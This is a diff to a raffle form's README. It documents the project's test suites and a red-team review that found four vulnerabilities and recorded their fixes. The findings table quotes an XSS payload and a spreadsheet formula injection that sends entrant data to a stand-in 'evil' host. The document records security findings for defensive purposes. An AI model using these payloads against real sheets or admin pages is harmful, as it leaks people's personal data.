@@ -343,15 +343,55 @@ version). Creating a *new* deployment mints a new URL and kills every printed QR
 ## Tests
 
 ```
-node test/test_raffle.js     # 72 server-side tests
-node test/test_form.js       # 47 browser tests (needs: npm install playwright)
+npm test                     # from the repo root: tracker + raffle + red-team
+node test/test_raffle.js     # 212 server-side tests
+node test/test_redteam.js    #  80 adversarial tests
+node test/test_form.js       #  59 browser tests (needs: npm install playwright)
 ```
+
+All three share `test/harness.js`, which loads the real `RaffleCode.gs` into a
+`vm` sandbox with stubbed Apps Script globals — so these are tests of the
+shipped file, not of a model of it.
 
 Covers identity normalization, the entry window, required fields and consent,
 one-entry-per-person across both keys and all phone formats, FUB-outage
 behaviour, the FUB payload shape, draw fairness and **non-repeatability** (a
 double-fired trigger cannot re-roll a winner or send a second email), manual
 disqualification, and admin-endpoint key gating.
+
+### The red-team suite
+
+`test/test_redteam.js` asks what a hostile entrant can make the form do, rather
+than whether it works. It is organised by threat (T1–T7) and every case runs
+against the real `RaffleCode.gs`. It was written on 2026-09-16, after the form
+was already live, and it found four things that were genuinely wrong:
+
+| Finding | What it meant | Fix |
+|---|---|---|
+| **Stored XSS on the admin pages** | The status and draw pages built HTML by concatenation from the winner's name, phone and email — all public text boxes. `<img src=x onerror=…> Smith` would have executed in Durand's browser the moment he opened the page to read the winner, i.e. at 6:15 in front of the crowd. | `raffleEsc_` at all 8 render sinks. Escaping stays at the **sink**, never at ingest — the host project removed ingest-escaping on purpose because it was mangling `O'Brien` on the way into FUB. |
+| **Sheets formula injection** | A name of `=IMPORTXML("https://evil/?d="&C2,"//a")` is a live formula the moment the entries sheet is opened, and can ship every entrant's name, email and phone to a third party. The junk-phone filter does not catch it: that reads digits, and a formula string can carry ten valid ones. | `raffleSafeCell_` on every entrant-supplied cell. |
+| **The endpoint was a free mailer** | Step 1 emails a code to any address posted. The shared 15/minute cap bounds the rate but sustains 21,600/day, so the 1,500/day Workspace quota dies in under two hours — taking verification codes, the Open House form's email and `sendErrorAlert` down with it, silently. | `raffleCheckCodeSendQuota_`: 3 codes per address per hour, 500 per rolling 6 hours, with an alert when the ceiling is hit. |
+| **Gmail alias stuffing** | `sam.vance@`, `samvance@` and `sam.vance+party@gmail.com` are one inbox and were three entries — stuffing with no second inbox and no second phone. | `raffleEmailKey_` collapses dots (Google only) and `+tags` (major consumer hosts). |
+
+One hardening change came out of it that was not a bug: a **live draw before
+6:15 now has to be asked for twice** (`&force=1`). The draw is deliberately
+irreversible, so an accidental tap on the admin bookmark at 4pm would have
+locked in a winner from a near-empty sheet. The 6:15 trigger forces it itself
+and test mode is exempt.
+
+These held up unchanged and are now regression-locked: the verify step writes
+from the server-cached values (so you cannot verify one address and enter
+another), the 5-attempt code cap, malformed-`vid` rejection, consent that
+cannot be spoofed with a truthy non-`Yes`, admin endpoints byte-identical for a
+wrong key and no key, draw non-repeatability, test mode never touching the live
+tab, FUB notes posted as plain text, and no CR/LF reaching an email header.
+
+Two residual risks are accepted and documented in the code rather than fixed:
+custom/Workspace domains also honour `+tags` and cannot be enumerated (what
+actually bounds stuffing is that every entry must *receive* a code, so each one
+costs a working inbox), and the phone is plausibility-checked but never
+ownership-verified — SMS verification needs A2P 10DLC carrier approval, which
+is weeks out.
 
 The browser suite covers the countdown maths, the 3:00 open flip and the 6:15
 close flip (both verified to happen with no reload), validation, phone
